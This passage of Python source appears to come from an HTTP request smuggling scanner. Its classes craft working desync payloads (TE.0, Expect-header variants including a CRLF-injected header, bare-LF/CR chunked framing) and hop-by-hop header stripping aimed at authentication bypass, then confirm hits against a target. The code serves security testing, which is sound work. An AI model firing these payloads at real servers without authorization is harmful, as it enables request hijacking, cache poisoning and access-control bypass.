				if not attack_resp:
					continue

				h_status = _get_status(harmless_resp)
				a_status = _get_status(attack_resp)
				h_has_canary = canary in harmless_resp
				a_has_canary = canary in attack_resp
				h_fp = _fp_from_bytes_or_str(harmless_resp)
				a_fp = _fp_from_bytes_or_str(attack_resp)
				fp_diff = a_fp.diff(h_fp)

				# Primary signal: status code or canary-presence flip.
				if h_status != a_status or h_has_canary != a_has_canary:
					differing_pairs += 1
					dp_attack_req = attack_req
					dp_attack_resp = attack_resp
					dp_harmless_resp = harmless_resp
					dp_a_status = a_status
					dp_h_status = h_status
				# Secondary signal: status and canary both match, but
				# the response structurally diverges across >=2 axes
				# (catches Set-Cookie / Content-Length-only flips).
				elif "status" in fp_diff or len(fp_diff) >= 2:
					fp_only_pairs += 1
					last_fp_diff = fp_diff
					fp_attack_req = attack_req
					fp_attack_resp = attack_resp
					fp_harmless_resp = harmless_resp
					fp_a_status = a_status
					fp_h_status = h_status
			except Exception:
				continue

		# Require >= 3/5 matched-pair differences before flagging, so a single
		# network blip doesn't masquerade as a finding.
		if differing_pairs >= 3 and dp_attack_req:
			print_fn("HdrRemoval", "Potential header removal vulnerability (Keep-Alive based, %d/5 differing pairs)" % differing_pairs)
			raw = RawPayload()
			raw.data = dp_attack_req.encode('latin-1')
			write_fn(self.host, raw, "HDRREMOVAL",
				response=dp_attack_resp, baseline=dp_harmless_resp,
				details={
					"scan": "header-removal",
					"label": "HDRREMOVAL",
					"attack_status": dp_a_status,
					"baseline_status": dp_h_status,
				})
			return True
		if fp_only_pairs >= 3 and fp_attack_req:
			print_fn("HdrRemoval", "Subtle header removal vulnerability (Keep-Alive based, %d/5 fp-only pairs, axes: %s)" % (
				fp_only_pairs, "+".join(sorted(last_fp_diff)) or "?"))
			raw = RawPayload()
			raw.data = fp_attack_req.encode('latin-1')
			write_fn(self.host, raw, "HDRREMOVAL_FP",
				response=fp_attack_resp, baseline=fp_harmless_resp,
				details={
					"scan": "header-removal",
					"label": "HDRREMOVAL_FP",
					"attack_status": fp_a_status,
					"baseline_status": fp_h_status,
					"fp_axes": sorted(last_fp_diff),
				})
			return True

		print_fn("HdrRemoval", "No header removal vulnerability detected")
		return False


class ScanExpectDesync:
	name = "Expect-Based Desync"

	def __init__(self, host, port, ssl_flag, timeout, method, endpoint, vhost, proxy, logh, quiet, cookies, oracle=None, extra_headers=None):
		self.host = host
		self.port = port
		self.ssl_flag = ssl_flag
		self.timeout = timeout
		self.method = method
		self.endpoint = endpoint
		self.vhost = vhost or host
		self.proxy = proxy
		self.logh = logh
		self.quiet = quiet
		self.cookies = cookies
		self.oracle = oracle
		self.extra_headers = extra_headers or []

	def run(self, print_fn, write_fn):
		cookie_hdr = ""
		if self.cookies:
			cookie_hdr = "Cookie: " + ''.join(self.cookies) + "\r\n"

		_terminated, smuggled_prefix, match_fn, gadget_label = _resolve_smuggle(self.oracle, self.vhost)
		baseline_fp, noisy = _victim_baseline_for(self)

		expect_variants = [
			("vanilla", "Expect: 100-continue"),
			("obfuscated", "Expect: x 100-continue"),
			("space", "Expect:  100-continue"),
			("tab", "Expect:\t100-continue"),
			("case", "expect: 100-continue"),
			("hyphen-space", "Expect: 100 -continue"),
			("title-case", "Expect: 100-Continue"),
			("trailing-cr", "Expect: 100-continue\r"),
			("twice", "Expect: 100-continue\r\nExpect: 100-continue"),
			# Expect: <value>\r\n\r\n<smuggled> -- header-body boundary smuggling.
			("crlf-injected", "Expect: 100-continue\r\nX-Smug: 1"),
		]

		found = False
		for variant_name, expect_header in expect_variants:
			cb = str(random.random()).split('.')[1]
			req = "%s %s?cb=%s HTTP/1.1\r\n" % (self.method, self.endpoint, cb)
			req += "Host: %s\r\n" % self.vhost
			req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.44 Safari/537.36\r\n"
			req += "Content-Type: application/x-www-form-urlencoded\r\n"
			if cookie_hdr:
				req += cookie_hdr
			req += expect_header + "\r\n"
			req += "Content-Length: %d\r\n" % len(smuggled_prefix)
			req += "Connection: keep-alive\r\n"
			req += "\r\n"
			req += smuggled_prefix
			req = _inject_extra_headers(req, self.extra_headers)

			follow_req = _build_raw_request("GET", self.endpoint, self.vhost,
				extra_headers=self.extra_headers)

			confirmed = 0
			for attempt in range(5):
				try:
					web = _make_connection(self.host, self.port, self.ssl_flag, self.timeout, self.proxy)
					web.pipeline_send([req, follow_req])
					responses = web.recv_multiple(2, self.timeout)
					web.close()

					if len(responses) >= 2:
						second_resp = _filter_response(responses[1].encode('latin-1'))
						victim_fp = _fp_from_bytes_or_str(second_resp)
						gadget_hit = match_fn(second_resp)
						victim_diverges = _is_structurally_different(victim_fp, baseline_fp, noisy)
						if gadget_hit or victim_diverges:
							confirmed += 1
							if confirmed >= 3:
								annot = []
								if gadget_hit:
									annot.append("gadget=%s" % gadget_label)
								if victim_diverges:
									diff = _structural_diff(victim_fp, baseline_fp, noisy)
									annot.append("fp=" + "+".join(sorted(diff)))
								print_fn("Expect", "Potential Expect-based desync (%s) [%s]: %s" % (
									variant_name, ",".join(annot), expect_header))
								raw = RawPayload()
								raw.data = req.encode('latin-1')
								write_fn(self.host, raw, "EXPECT_%s" % variant_name,
									response=second_resp,
									baseline=getattr(self, "_victim_baseline_raw", None),
									details={
										"scan": "expect",
										"label": variant_name,
										"attack_status": _get_status(second_resp),
										"baseline_status": baseline_fp.status,
										"fp_axes": sorted(_structural_diff(victim_fp, baseline_fp, noisy)),
										"gadget_hit": gadget_hit,
									})
								found = True
								break
				except Exception:
					continue

		if not found:
			print_fn("Expect", "No Expect-based desync detected")
		return found


class ScanTE0:
	"""Front-end honors TE: chunked, backend honors CL: 0.

	The request includes BOTH headers. A front-end that picks
	Transfer-Encoding will read the full chunked body and forward it; a
	backend that picks Content-Length: 0 will treat the bytes *after* the
	chunked terminator as the start of the next pipelined request. We
	confirm by sending a victim request on the same connection and checking
	whether it received the smuggled /robots.txt response.
	"""

	name = "TE.0 Desync"

	def __init__(self, host, port, ssl_flag, timeout, method, endpoint, vhost, proxy, logh, quiet, cookies, oracle=None, extra_headers=None):
		self.host = host
		self.port = port
		self.ssl_flag = ssl_flag
		self.timeout = timeout
		self.method = method
		self.endpoint = endpoint
		self.vhost = vhost or host
		self.proxy = proxy
		self.logh = logh
		self.quiet = quiet
		self.cookies = cookies
		self.oracle = oracle
		self.extra_headers = extra_headers or []

	def run(self, print_fn, write_fn):
		cookie_hdr = ""
		if self.cookies:
			cookie_hdr = "Cookie: " + ''.join(self.cookies) + "\r\n"

		smuggled, _unterm, match_fn, gadget_label = _resolve_smuggle(self.oracle, self.vhost)
		baseline_fp, noisy = _victim_baseline_for(self)
		# TE: chunked body that fully terminates, then trailing smuggled
		# bytes the backend reads as the next request when it honors CL=0.
		body = "0\r\n\r\n" + smuggled

		confirmed = 0
		for attempt in range(5):
			try:
				cb = str(random.random()).split('.')[1]
				req = "%s %s?cb=%s HTTP/1.1\r\n" % (self.method, self.endpoint, cb)
				req += "Host: %s\r\n" % self.vhost
				req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.44 Safari/537.36\r\n"
				req += "Content-Type: application/x-www-form-urlencoded\r\n"
				if cookie_hdr:
					req += cookie_hdr
				req += "Transfer-Encoding: chunked\r\n"
				req += "Content-Length: 0\r\n"
				req += "Connection: keep-alive\r\n"
				req += "\r\n"
				req += body
				req = _inject_extra_headers(req, self.extra_headers)

				follow_req = _build_raw_request("GET", self.endpoint, self.vhost,
					extra_headers=self.extra_headers)

				web = _make_connection(self.host, self.port, self.ssl_flag, self.timeout, self.proxy)
				web.pipeline_send([req, follow_req])
				responses = web.recv_multiple(2, self.timeout)
				web.close()

				if len(responses) >= 2:
					second_resp = _filter_response(responses[1].encode('latin-1'))
					victim_fp = _fp_from_bytes_or_str(second_resp)
					gadget_hit = match_fn(second_resp)
					victim_diverges = _is_structurally_different(victim_fp, baseline_fp, noisy)
					if gadget_hit or victim_diverges:
						confirmed += 1
						if confirmed >= 3:
							annot = []
							if gadget_hit:
								annot.append("gadget=%s" % gadget_label)
							if victim_diverges:
								diff = _structural_diff(victim_fp, baseline_fp, noisy)
								annot.append("fp=" + "+".join(sorted(diff)))
							print_fn("TE.0", "Confirmed TE.0 desync [%s]" % ",".join(annot))
							raw = RawPayload()
							raw.data = req.encode('latin-1')
							write_fn(self.host, raw, "TE0",
								response=second_resp,
								baseline=getattr(self, "_victim_baseline_raw", None),
								details={
									"scan": "te0",
									"label": gadget_label,
									"attack_status": _get_status(second_resp),
									"baseline_status": baseline_fp.status,
									"fp_axes": sorted(_structural_diff(victim_fp, baseline_fp, noisy)),
									"gadget_hit": gadget_hit,
								})
							return True
			except Exception:
				continue

		print_fn("TE.0", "No TE.0 desync detected")
		return False


class ScanBareLFChunked:
	"""Bare-LF chunked smuggling: chunk-size + bare LF terminator instead of
	CRLF. RFC 9112 forbids bare LF in chunked framing but several legacy
	servers / proxies accept it, while peers do not. That mismatch desyncs
	the channel. We test both bare-LF and bare-CR terminators.
	"""

	name = "Bare-LF / Bare-CR Chunked Desync"

	def __init__(self, host, port, ssl_flag, timeout, method, endpoint, vhost, proxy, logh, quiet, cookies, oracle=None, extra_headers=None):
		self.host = host
		self.port = port
		self.ssl_flag = ssl_flag
		self.timeout = timeout
		self.method = method
		self.endpoint = endpoint
		self.vhost = vhost or host
		self.proxy = proxy
		self.logh = logh
		self.quiet = quiet
		self.cookies = cookies
		self.oracle = oracle
		self.extra_headers = extra_headers or []

	def _attempt(self, variant_name, terminator_kind, print_fn, write_fn):
		cookie_hdr = ""
		if self.cookies:
			cookie_hdr = "Cookie: " + ''.join(self.cookies) + "\r\n"

		smuggled, _unterm, match_fn, gadget_label = _resolve_smuggle(self.oracle, self.vhost)
		baseline_fp, noisy = _victim_baseline_for(self)

		# Build a bare-LF / bare-CR chunked body that wraps the smuggled
		# prefix. Format: <hex>\n<smuggled>\n0\n\n  (LF variant)
		if terminator_kind == "lf":
			body = ("%x" % len(smuggled)) + "\n" + smuggled + "\n" + EndChunkBareLF()
		elif terminator_kind == "cr":
			body = ("%x" % len(smuggled)) + "\r" + smuggled + "\r" + EndChunkBareCR()
		else:
			return False

		confirmed = 0
		for attempt in range(5):
			try:
				cb = str(random.random()).split('.')[1]
				req = "%s %s?cb=%s HTTP/1.1\r\n" % (self.method, self.endpoint, cb)
				req += "Host: %s\r\n" % self.vhost
				req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.44 Safari/537.36\r\n"
				req += "Content-Type: application/x-www-form-urlencoded\r\n"
				if cookie_hdr:
					req += cookie_hdr
				req += "Transfer-Encoding: chunked\r\n"
				req += "Content-Length: %d\r\n" % len(body)
				req += "Connection: keep-alive\r\n"
				req += "\r\n"
				req += body
				req = _inject_extra_headers(req, self.extra_headers)

				follow_req = _build_raw_request("GET", self.endpoint, self.vhost,
					extra_headers=self.extra_headers)

				web = _make_connection(self.host, self.port, self.ssl_flag, self.timeout, self.proxy)
				web.pipeline_send([req, follow_req])
				responses = web.recv_multiple(2, self.timeout)
				web.close()

				if len(responses) >= 2:
					second_resp = _filter_response(responses[1].encode('latin-1'))
					victim_fp = _fp_from_bytes_or_str(second_resp)
					gadget_hit = match_fn(second_resp)
					victim_diverges = _is_structurally_different(victim_fp, baseline_fp, noisy)
					if gadget_hit or victim_diverges:
						confirmed += 1
						if confirmed >= 3:
							annot = []
							if gadget_hit:
								annot.append("gadget=%s" % gadget_label)
							if victim_diverges:
								diff = _structural_diff(victim_fp, baseline_fp, noisy)
								annot.append("fp=" + "+".join(sorted(diff)))
							print_fn("BareChunk", "Confirmed %s desync [%s]" % (variant_name, ",".join(annot)))
							raw = RawPayload()
							raw.data = req.encode('latin-1')
							write_fn(self.host, raw, "BARECHUNK_%s" % terminator_kind.upper(),
								response=second_resp,
								baseline=getattr(self, "_victim_baseline_raw", None),
								details={
									"scan": "bare-lf",
									"label": variant_name,
									"attack_status": _get_status(second_resp),
									"baseline_status": baseline_fp.status,
									"fp_axes": sorted(_structural_diff(victim_fp, baseline_fp, noisy)),
									"gadget_hit": gadget_hit,
								})
							return True
			except Exception:
				continue
		return False

	def run(self, print_fn, write_fn):
		found = False
		if self._attempt("bare-LF chunked", "lf", print_fn, write_fn):
			found = True
		if self._attempt("bare-CR chunked", "cr", print_fn, write_fn):
			found = True
		if not found:
			print_fn("BareChunk", "No bare-LF / bare-CR chunked desync detected")
		return found


class ScanHopByHop:
	"""Hop-by-hop header poisoning / auth bypass detection.

	A `Connection: <header-name>` instructs intermediaries to strip
	<header-name> before forwarding. If a misconfigured front-end honors
	this and strips an authentication header (Cookie / Authorization), the
	backend will see an *unauthenticated* request -- causing a 401/403
	baseline to drop to 200 (auth-required pages now public) or vice versa.

	We compare three responses on fresh connections:
	  (1) baseline GET with cookies/auth intact
	  (2) attack GET with `Connection: Cookie, Authorization`
	  (3) confirmation pair (re-run #2)

	A reproducible status change between (1) and (2,3) indicates the
	intermediary stripped the named header.
	"""

	name = "Hop-by-hop Auth Bypass"

	def __init__(self, host, port, ssl_flag, timeout, method, endpoint, vhost, proxy, logh, quiet, cookies, oracle=None, extra_headers=None):
		self.host = host
		self.port = port
		self.ssl_flag = ssl_flag
		self.timeout = timeout
		self.method = method
		self.endpoint = endpoint
		self.vhost = vhost or host
		self.proxy = proxy
		self.logh = logh
		self.quiet = quiet
		self.cookies = cookies
		self.oracle = oracle
		# Named ``custom_headers`` to avoid clashing with the ``extra_headers``
		# param of ``_request`` (which carries the ``Connection: <target>``
		# strip directive). These are the user's real request headers --
		# carrying the genuine Authorization here is what makes this auth-bypass
		# scan meaningful: baseline is authenticated, so stripping the header
		# produces a detectable status flip.
		self.custom_headers = extra_headers or []

	def _request(self, extra_headers):
		try:
			web = _make_connection(self.host, self.port, self.ssl_flag, self.timeout, self.proxy)
			cb = str(random.random()).split('.')[1]
			req = "GET %s?cb=%s HTTP/1.1\r\n" % (self.endpoint, cb)
			req += "Host: %s\r\n" % self.vhost
			req += "User-Agent: smuggler\r\n"
			if self.cookies:
				req += "Cookie: " + ''.join(self.cookies) + "\r\n"
			for h in extra_headers:
				req += h + "\r\n"
			req += "Connection: keep-alive\r\n"
			req += "\r\n"
			req = _inject_extra_headers(req, self.custom_headers)
			web.send(req.encode())
			res = web.recv_all(self.timeout)
			web.close()
			return _filter_response(res), req
		except Exception:
			return None, None

	def run(self, print_fn, write_fn):
		# Multi-sample baseline so we can ignore axes that the server
		# itself flips between identical requests (Date, request-ids,
		# load-balancer cookies). Without this, every single attack
		# probe would look "different" because of timestamps.
		baseline_resps = []
		baseline_fps = []
		for _ in range(3):
			r, _ = self._request([])
			baseline_resps.append(r)
			baseline_fps.append(_fp_from_bytes_or_str(r))
		# Use the first sample as the canonical baseline fingerprint;
		# anything that varied across the three samples is "noisy" for
		# this target and excluded from diffs.
		baseline_fp = baseline_fps[0]
		noisy_axes = set()
		for fp in baseline_fps[1:]:
			noisy_axes |= baseline_fp.diff(fp)
		baseline_status = baseline_fp.status
		if not baseline_status:
			print_fn("HopByHop", "Cannot establish baseline, skipping")
			return False

		# Headers we'll try to have the front-end strip. Listing one per
		# attack is more diagnostic than listing them all together.
		strip_targets = ["Cookie", "Authorization", "X-Forwarded-For", "X-Real-IP"]
		found = False
		for target in strip_targets:
			attack_resp, attack_req = self._request(["Connection: %s" % target])
			attack_fp = _fp_from_bytes_or_str(attack_resp)
			attack_status = attack_fp.status
			status_flipped = attack_status and (attack_status != baseline_status)
			fp_diff = _structural_diff(attack_fp, baseline_fp, noisy_axes)
			fp_diverges = "status" in fp_diff or (len(fp_diff) >= 2)
			# Skip: probe failed entirely, or it matches baseline exactly.
			if not attack_status or (not status_flipped and not fp_diverges):
				continue

			# Confirm: re-run 2 more times; only flag if the same
			# divergence is reproducible (filters transient blips).
			repro = 0
			repro_fp_only = 0
			for _ in range(3):
				c_resp, _ = self._request(["Connection: %s" % target])
				c_fp = _fp_from_bytes_or_str(c_resp)
				c_status = c_fp.status
				if status_flipped and c_status == attack_status and c_status != baseline_status:
					repro += 1
				elif fp_diverges and not status_flipped:
					c_diff = _structural_diff(c_fp, baseline_fp, noisy_axes)
					if "status" in c_diff or len(c_diff) >= 2:
						repro_fp_only += 1
			if repro >= 2:
				print_fn("HopByHop", "Front-end strips %s: baseline=%s attack=%s" % (
					target, baseline_status, attack_status))
				raw = RawPayload()
				raw.data = (attack_req or "").encode('latin-1')
				write_fn(self.host, raw, "HOPBYHOP_%s" % target.replace("-", ""),
					response=attack_resp, baseline=baseline_resps[0],
					details={
						"scan": "hop-by-hop",
						"label": "strip:%s" % target,
						"mutation": target,
						"attack_status": attack_status,
						"baseline_status": baseline_status,
						"fp_axes": sorted(fp_diff),
					})
				found = True
			elif repro_fp_only >= 2:
				# Status didn't move but headers/body did, reproducibly.
				# This catches Set-Cookie / Vary / Cache-Control flips
				# that the old status-only check ignored entirely.
				print_fn("HopByHop", "Subtle hop-by-hop strip of %s (status=%s, fp axes: %s)" % (
					target, baseline_status, "+".join(sorted(fp_diff)) or "?"))
				raw = RawPayload()
				raw.data = (attack_req or "").encode('latin-1')
				write_fn(self.host, raw, "HOPBYHOP_FP_%s" % target.replace("-", ""),
					response=attack_resp, baseline=baseline_resps[0],
					details={
						"scan": "hop-by-hop",
						"label": "strip-fp:%s" % target,
						"mutation": target,
						"attack_status": attack_status,
						"baseline_status": baseline_status,
						"fp_axes": sorted(fp_diff),
					})
				found = True

		if not found:
			print_fn("HopByHop", "No hop-by-hop header stripping detected")
		return found


ALL_SCANS = {
	"cl0": ScanCL0,
	"pause": ScanPauseDesync,
	"connection-state": ScanConnectionState,
	"parser-discrepancy": ScanParserDiscrepancy,
	"header-removal": ScanHeaderRemoval,
	"expect": ScanExpectDesync,
	"te0": ScanTE0,
	"bare-lf": ScanBareLFChunked,
	"hop-by-hop": ScanHopByHop,
}
